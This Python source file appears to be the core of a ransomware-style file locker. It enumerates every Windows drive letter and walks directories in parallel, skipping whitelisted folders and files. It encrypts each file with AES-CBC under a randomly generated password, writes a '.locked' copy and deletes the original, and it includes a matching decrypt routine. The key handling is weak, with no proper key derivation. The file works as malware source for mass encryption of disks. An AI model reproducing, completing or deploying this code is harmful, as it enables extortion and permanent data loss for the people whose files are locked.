import multiprocessing
import os
import time
import random
import string
import sys
import threading

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
except ImportError as exc:
    print('ERROR: Import failed, you may need to run "pip install cryptography".\n{:>7}{}'.format('', exc))
    sys.exit(1)

class LockPath:

    def __init__(self, paths, WHITE_DIR, WHITE_FILE, encrypt_size, decrypt_size, password, keylen, ivlen):
        self.paths = paths
        self.white_dir = WHITE_DIR
        self.white_file = WHITE_FILE
        self.encrypt_size = encrypt_size
        self.decrypt_size = decrypt_size
        self.password = password
        self.keylen = keylen
        self.ivlen = ivlen

    def encrypt(self, plaintext):
        key = _get_password_key(self.password, self.keylen)
        iv = os.urandom(self.ivlen)  # IV is the same as block size for CBC mode
        key = _encode(key)
        # Encrypt
        padded_plaintext = _pkcs7_pad(plaintext, self.ivlen)
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        ciphertext_binary = encryptor.update(padded_plaintext) + encryptor.finalize()
        # Finalize    
        ciphertext = iv + ciphertext_binary
        return ciphertext

    def decrypt(self, ciphertext):
        key = _get_password_key(self.password, self.keylen)
        ciphertext_prefixed_binary = ciphertext
        iv = ciphertext_prefixed_binary[:self.ivlen] 
        # encode key to bytes
        key = _encode(key)
        # Decrypt
        ciphertext_binary = ciphertext_prefixed_binary[self.ivlen:]
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
        decryptor = cipher.decryptor()
        padded_plaintext  = decryptor.update(ciphertext_binary) + decryptor.finalize()
        plaintext = _pkcs7_unpad(padded_plaintext)
        return plaintext

    def read_file_encrypt(self, filepath):
        with open(filepath, 'rb') as f:
            while True:
                block = f.read(self.encrypt_size)
                if block:
                    yield block                
                else:
                    return

    def read_file_decrypt(self, filepath):
        with open(filepath, 'rb') as f:
            while True:
                block = f.read(self.decrypt_size)
                if block:
                    yield block                
                else:
                    return

    def write_file(self, filepath, content):
        # Write the file.
        with open(filepath, 'ab') as ofp:
            ofp.write(content)

    def encrypt_process(self, root, filename):
        for data in self.read_file_encrypt(root+'/'+filename):
            ciphertext = self.encrypt(data)
            self.write_file(root+'/'+filename+".locked", ciphertext)
        else:
            os.remove(root+'/'+filename)

    def decrypt_process(self, root, filename):
        for data in self.read_file_decrypt(root+'/'+filename):
            plaintext = self.decrypt(data)
            self.write_file(root+'/'+filename.replace(".locked", '', 1), plaintext)
        else:
            os.remove(root+'/'+filename)

    def multiprocessing_lock_path(self):
        cores_num = get_cores_num()
        pool = multiprocessing.Pool(processes=cores_num)
        for path in self.paths:
            for root, subdirs, subfiles in os.walk(path):
                # from subdirs remove white dir
                for dirname in subdirs:
                    if dirname.upper() in self.white_dir:
                        subdirs.remove(dirname) 
                    else: pass
                # from subfiles remove white file
                for filename in subfiles:
                    if filename.upper() in self.white_file:
                        subfiles.remove(filename)
                    else: pass
                # begin encrypt
                for filename in subfiles:
                    pool.apply_async(self.encrypt_process, (root, filename))
        pool.close()
        pool.join()
                
    def multiprocessing_unlock_path(self):
        cores_num = get_cores_num()
        pool = multiprocessing.Pool(processes=cores_num)
        for path in self.paths:
            for root, subdirs, subfiles in os.walk(path):  
                # from subdirs remove white dir
                for dirname in subdirs:
                    if dirname.upper() in self.white_dir:
                        subdirs.remove(dirname) 
                    else: pass
                # from subfiles remove white file
                for filename in subfiles:
                    if filename.upper() in self.white_file:
                        subfiles.remove(filename)
                    else: pass
                # from subfils remove didn't be locked file
                for filename in subfiles:
                    if ".locked" not in filename:
                        subfiles.remove(filename)
                    else: pass
                # begin decrypt   
                for filename in subfiles:
                    pool.apply_async(self.decrypt_process, (root, filename))   
        pool.close()
        pool.join()    

def _get_password_key(password, keylen):
    
    if len(password) >= keylen:
        key = password[:keylen]
    else:
        key = _pkcs7_pad(password, keylen)
    return key

def _pkcs7_pad(text, size):
    #  pad data to size's interger muliple
    #  special conditon: length is size's interger muliple, numbytes_num = 16
    length = len(text)
    remainder = length % size
    num_bytes = size - (length % size)
    
    # Works for python3 and python2.
    if isinstance(text, str):
        text += chr(num_bytes) * num_bytes
    elif isinstance(text, bytes):
        text += bytearray([num_bytes] * num_bytes)
    else:
        assert False
    return text

def _pkcs7_unpad(padded):
    if isinstance(padded, str):
        unpadded_len = ord(padded[-1])
    elif isinstance(padded, bytes):
        unpadded_len = padded[-1]
    else:
        assert False
    return padded[:-unpadded_len]

def _encode(val):
    # Encode a string for Python 2/3 compatibility.
    if isinstance(val, str):
        try:
            val = val.encode('utf-8')
        except UnicodeDecodeError:
            pass  # python 2, don't care
    return val

def encode_text(text):
    bytes_text = text.encode()
    return bytes_text

def decode_text(bytes_text):
    text = bytes_text.decode()
    return text

def get_cores_num():
    nums = multiprocessing.cpu_count()
    return nums    

def get_password():
    pw = ''.join(random.choices(string.ascii_letters + string.digits 
    + string.punctuation, k=32))
    
    return pw

def get_disklist():

    disk_list = []
    for letter in string.ascii_uppercase:
        disk = letter + ":/"
        if os.path.isdir(disk):
            disk_list.append(disk)  
    return disk_list

def timeit(func):
    def wrapper():
        start = time.perf_counter()
        func()
        end = time.perf_counter()
        print(end - start)
    return wrapper
